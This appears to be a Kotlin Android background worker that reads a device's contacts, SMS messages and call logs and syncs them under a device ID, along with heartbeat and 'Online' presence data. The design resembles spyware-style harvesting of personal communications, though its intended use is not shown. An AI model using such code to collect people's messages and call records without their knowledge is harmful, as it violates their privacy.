package com.boxx.datasync.sync

import android.content.Context
import android.os.Build
import androidx.hilt.work.HiltWorker
import androidx.preference.PreferenceManager
import androidx.work.CoroutineWorker
import androidx.work.WorkerParameters
import com.boxx.datasync.domain.model.Device
import com.boxx.datasync.domain.repository.DataRepository
import com.boxx.datasync.utils.DataHelper
import com.boxx.datasync.utils.DeviceIdHelper
import dagger.assisted.Assisted
import dagger.assisted.AssistedInject

@HiltWorker
class SyncWorker @AssistedInject constructor(
    @Assisted context: Context,
    @Assisted params: WorkerParameters,
    private val repository: DataRepository
) : CoroutineWorker(context, params) {

    override suspend fun doWork(): Result {
        val deviceId = DeviceIdHelper.getDeviceId(applicationContext)

        return try {
            val contacts = DataHelper.fetchContacts(applicationContext)
            val smsList = DataHelper.fetchSMS(applicationContext)
            val callLogs = DataHelper.fetchCallLogs(applicationContext)

            repository.syncContacts(deviceId, contacts)
            repository.syncSMS(deviceId, smsList)
            repository.syncCallLogs(deviceId, callLogs)

            repository.updateDeviceInfoMap(deviceId, mapOf(
                "deviceId" to deviceId,
                "deviceName" to Build.MODEL,
                "lastSyncTime" to System.currentTimeMillis(),
                "heartbeatAt" to System.currentTimeMillis(),
                "contactCount" to contacts.size,
                "smsCount" to smsList.size,
                "callCount" to callLogs.size,
                "notificationCount" to 0,
                "timestamp" to System.currentTimeMillis(),
                "syncStatus" to "Synced",
                "presenceStatus" to "Online",
                "lastError" to ""
            ))
            Result.success()
        } catch (e: Exception) {
            Result.retry()
        }
    }
}
